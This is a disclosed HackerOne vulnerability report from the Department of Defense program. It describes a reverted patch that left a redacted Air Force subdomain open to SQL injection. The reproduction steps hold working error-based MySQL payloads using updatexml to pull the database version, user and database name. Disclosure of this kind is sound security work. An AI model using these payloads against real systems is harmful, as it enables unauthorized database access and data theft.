---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '277380'
original_report_id: '277380'
title: SQL Injection on █████
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2017-10-15T12:16:38.080Z'
disclosed_at: '2022-05-12T19:57:32.374Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
- sql-injection
---

# SQL Injection on █████

## Metadata

- HackerOne Report ID: 277380
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2022-05-12T19:57:32.374Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

#### Background:
It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

### Summary:
An Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.

### Description:
The `███=` parameter on `https://███████/█████████` does not properly sanitize ' characters, allowing an attacker to execute SQL queries!

### Impact

This could potentially expose sensitive information because an attacker could potentially dump the databases on this server!

### Step-by-step Reproduction Instructions

    1.) Open Firefox or any browser
    2.) Visit `https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil`
    3.) You will see the MySQL version in the response => `██████████`

User - `███████`
payload => `https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil`

Database - `████`
payload => `https://██████/█████████████=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil`

██████
### Suggested Mitigation/Remediation Actions

Sanitize input!

Thanks!
- Corben Douglas [@sxcurity](https://twitter.com/sxcurity)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
